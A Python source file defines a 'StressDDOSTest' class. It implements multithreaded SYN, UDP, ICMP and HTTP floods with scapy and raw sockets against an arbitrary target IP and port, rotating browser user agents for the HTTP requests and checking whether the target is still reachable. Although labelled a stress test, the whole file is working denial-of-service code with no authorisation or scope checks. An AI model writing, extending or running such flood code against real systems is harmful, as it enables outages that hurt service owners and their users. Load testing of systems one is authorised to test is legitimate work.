import psutil
from scapy.all import IP, TCP, UDP, ICMP, RandShort, send, sr1
import time
import random
import socket
import threading
import queue
from concurrent.futures import ThreadPoolExecutor

class StressDDOSTest:
    def __init__(self, target_ip, port=80):
        self.target_ip = target_ip
        self.port = port
        self.stop_attack = False
        self.attack_threads = []
        self.results_queue = queue.Queue()

    def simple_syn_flood(self, count=100, interval=0.01, threads=1):
        results = []
        try:
            print(f"Starting simple SYN flood on {self.target_ip}:{self.port} with {count} packets using {threads} threads...")
            try:
                from scapy.all import IP, TCP, send
            except ImportError:
                raise ImportError("Scapy is not installed. Please install it using 'pip install scapy'.")
            except OSError:
                raise OSError("Npcap/WinPcap is not installed. Please install it for Scapy to function correctly on Windows.")
            
            packets_per_thread = max(1, count // threads)
            
            def send_packets(thread_id, packet_count):
                for i in range(packet_count):
                    if self.stop_attack:
                        break
                    ip_layer = IP(dst=self.target_ip)
                    tcp_layer = TCP(sport=RandShort(), dport=self.port, flags="S")
                    packet = ip_layer / tcp_layer
                    send(packet, verbose=0)
                    time.sleep(interval)
                self.results_queue.put(("Simple SYN Flood", True, f"Thread {thread_id}: Sent {packet_count} SYN packets"))
            
            self.stop_attack = False
            self.attack_threads = []
            with ThreadPoolExecutor(max_workers=threads) as executor:
                for i in range(threads):
                    executor.submit(send_packets, i+1, packets_per_thread)
            
            total_packets = 0
            while not self.results_queue.empty():
                result = self.results_queue.get()
                results.append(result)
                msg_parts = result[2].split("Sent ")[1].split(" SYN")[0]
                total_packets += int(msg_parts)
            
            results.append(("Simple SYN Flood Summary", True, f"Total: Sent {total_packets} SYN packets to {self.target_ip}:{self.port}"))
        except (ImportError, OSError) as e:
            results.append(("Simple SYN Flood", False, str(e)))
        except Exception as e:
            results.append(("Simple SYN Flood", False, f"An unexpected error occurred during SYN flood: {e}"))
        return results

    def udp_flood(self, count=100, interval=0.01, threads=1, packet_size=1024):
        results = []
        try:
            print(f"Starting UDP flood on {self.target_ip}:{self.port} with {count} packets using {threads} threads...")
            try:
                from scapy.all import IP, UDP, send
            except ImportError:
                raise ImportError("Scapy is not installed. Please install it using 'pip install scapy'.")
            except OSError:
                raise OSError("Npcap/WinPcap is not installed. Please install it for Scapy to function correctly on Windows.")
            
            packets_per_thread = max(1, count // threads)
            
            def send_packets(thread_id, packet_count):
                for i in range(packet_count):
                    if self.stop_attack:
                        break
                    payload = bytes([random.randint(0, 255) for _ in range(packet_size)])
                    ip_layer = IP(dst=self.target_ip)
                    udp_layer = UDP(sport=RandShort(), dport=self.port)
                    packet = ip_layer / udp_layer / payload
                    send(packet, verbose=0)
                    time.sleep(interval)
                self.results_queue.put(("UDP Flood", True, f"Thread {thread_id}: Sent {packet_count} UDP packets"))
            
            self.stop_attack = False
            self.attack_threads = []
            with ThreadPoolExecutor(max_workers=threads) as executor:
                for i in range(threads):
                    executor.submit(send_packets, i+1, packets_per_thread)
            
            total_packets = 0
            while not self.results_queue.empty():
                result = self.results_queue.get()
                results.append(result)
                msg_parts = result[2].split("Sent ")[1].split(" UDP")[0]
                total_packets += int(msg_parts)
            
            results.append(("UDP Flood Summary", True, f"Total: Sent {total_packets} UDP packets ({packet_size} bytes each) to {self.target_ip}:{self.port}"))
        except (ImportError, OSError) as e:
            results.append(("UDP Flood", False, str(e)))
        except Exception as e:
            results.append(("UDP Flood", False, f"An unexpected error occurred during UDP flood: {e}"))
        return results

    def http_flood(self, count=100, interval=0.1, threads=1, method="GET", path="/"):
        results = []
        try:
            print(f"Starting HTTP {method} flood on {self.target_ip}:{self.port} with {count} requests using {threads} threads...")
            
            packets_per_thread = max(1, count // threads)
            
            def send_requests(thread_id, request_count):
                for i in range(request_count):
                    if self.stop_attack:
                        break
                    try:
                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        s.settimeout(2)
                        s.connect((self.target_ip, self.port))
                        
                        user_agents = [
                            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
                            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
                            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
                            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"
                        ]
                        user_agent = random.choice(user_agents)
                        
                        if method == "GET":
                            request = f"GET {path} HTTP/1.1\r\nHost: {self.target_ip}\r\nUser-Agent: {user_agent}\r\nConnection: keep-alive\r\n\r\n"
                        elif method == "POST":
                            data = "data=" + "A" * random.randint(10, 1000)
                            request = f"POST {path} HTTP/1.1\r\nHost: {self.target_ip}\r\nUser-Agent: {user_agent}\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: {len(data)}\r\nConnection: keep-alive\r\n\r\n{data}"
                        
                        s.send(request.encode())
                        s.close()
                        time.sleep(interval)
                    except Exception as e:
                        pass
                
                self.results_queue.put((f"HTTP {method} Flood", True, f"Thread {thread_id}: Sent {request_count} HTTP {method} requests"))
            
            self.stop_attack = False
            self.attack_threads = []
            with ThreadPoolExecutor(max_workers=threads) as executor:
                for i in range(threads):
                    executor.submit(send_requests, i+1, packets_per_thread)
            
            total_requests = 0
            while not self.results_queue.empty():
                result = self.results_queue.get()
                results.append(result)
                msg_parts = result[2].split("Sent ")[1].split(" HTTP")[0]
                total_requests += int(msg_parts)
            
            results.append((f"HTTP {method} Flood Summary", True, f"Total: Sent {total_requests} HTTP {method} requests to {self.target_ip}:{self.port}{path}"))
        except Exception as e:
            results.append((f"HTTP {method} Flood", False, f"An unexpected error occurred during HTTP flood: {e}"))
        return results

    def icmp_flood(self, count=100, interval=0.01, threads=1):
        results = []
        try:
            print(f"Starting ICMP flood (ping flood) on {self.target_ip} with {count} packets using {threads} threads...")
            try:
                from scapy.all import IP, ICMP, send
            except ImportError:
                raise ImportError("Scapy is not installed. Please install it using 'pip install scapy'.")
            except OSError:
                raise OSError("Npcap/WinPcap is not installed. Please install it for Scapy to function correctly on Windows.")
            
            packets_per_thread = max(1, count // threads)
            
            def send_packets(thread_id, packet_count):
                for i in range(packet_count):
                    if self.stop_attack:
                        break
                    ip_layer = IP(dst=self.target_ip)
                    icmp_layer = ICMP(type=8, code=0)
                    packet = ip_layer / icmp_layer / ("A" * 56)
                    send(packet, verbose=0)
                    time.sleep(interval)
                self.results_queue.put(("ICMP Flood", True, f"Thread {thread_id}: Sent {packet_count} ICMP packets"))
            
            self.stop_attack = False
            self.attack_threads = []
            with ThreadPoolExecutor(max_workers=threads) as executor:
                for i in range(threads):
                    executor.submit(send_packets, i+1, packets_per_thread)
            
            total_packets = 0
            while not self.results_queue.empty():
                result = self.results_queue.get()
                results.append(result)
                msg_parts = result[2].split("Sent ")[1].split(" ICMP")[0]
                total_packets += int(msg_parts)
            
            results.append(("ICMP Flood Summary", True, f"Total: Sent {total_packets} ICMP packets to {self.target_ip}"))
        except (ImportError, OSError) as e:
            results.append(("ICMP Flood", False, str(e)))
        except Exception as e:
            results.append(("ICMP Flood", False, f"An unexpected error occurred during ICMP flood: {e}"))
        return results

    def monitor_system_resources(self, duration=10):
        results = []
        cpu_usages = []
        mem_usages = []
        print(f"Monitoring system resources for {duration} seconds...")
        for _ in range(duration):
            cpu_usages.append(psutil.cpu_percent(interval=1))
            mem_usages.append(psutil.virtual_memory().percent)
            time.sleep(1)

        avg_cpu = sum(cpu_usages) / len(cpu_usages) if cpu_usages else 0
        avg_mem = sum(mem_usages) / len(mem_usages) if mem_usages else 0

        results.append(("System Resource Monitoring (CPU)", True, f"Average CPU Usage: {avg_cpu:.2f}%"))
        results.append(("System Resource Monitoring (Memory)", True, f"Average Memory Usage: {avg_mem:.2f}%"))
        return results

    def stop_all_attacks(self):
        self.stop_attack = True
        for thread in self.attack_threads:
            if thread.is_alive():
                thread.join(timeout=1.0)
        self.attack_threads = []
        return [("Attack Stop", True, "All attack threads have been stopped")]

    def test_target_availability(self):
        results = []
        try:
            start_time = time.time()
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(2)
            result = s.connect_ex((self.target_ip, self.port))
            end_time = time.time()
            response_time = (end_time - start_time) * 1000  # Convert to ms
            
            if result == 0:
                s.close()
                results.append(("Target Availability", True, f"Target {self.target_ip}:{self.port} is available (response time: {response_time:.2f}ms)"))
            else:
                results.append(("Target Availability", False, f"Target {self.target_ip}:{self.port} is not available (error code: {result})"))
        except Exception as e:
            results.append(("Target Availability", False, f"Error checking target availability: {e}"))
        return results

    def run_all_tests(self, syn_count=100, syn_interval=0.01, udp_count=100, udp_interval=0.01, 
                     http_count=100, http_interval=0.1, icmp_count=100, icmp_interval=0.01,
                     threads=2, monitor_duration=10, run_all=False):
        results = []
        
        results.extend(self.test_target_availability())
        
        if run_all or True:
            results.extend(self.simple_syn_flood(count=syn_count, interval=syn_interval, threads=threads))
        
        if run_all:
            results.extend(self.udp_flood(count=udp_count, interval=udp_interval, threads=threads))
            
            results.extend(self.http_flood(count=http_count, interval=http_interval, threads=threads, method="GET"))
            
            results.extend(self.icmp_flood(count=icmp_count, interval=icmp_interval, threads=threads))
        
        results.extend(self.monitor_system_resources(duration=monitor_duration))
        
        results.extend(self.test_target_availability())
        
        return results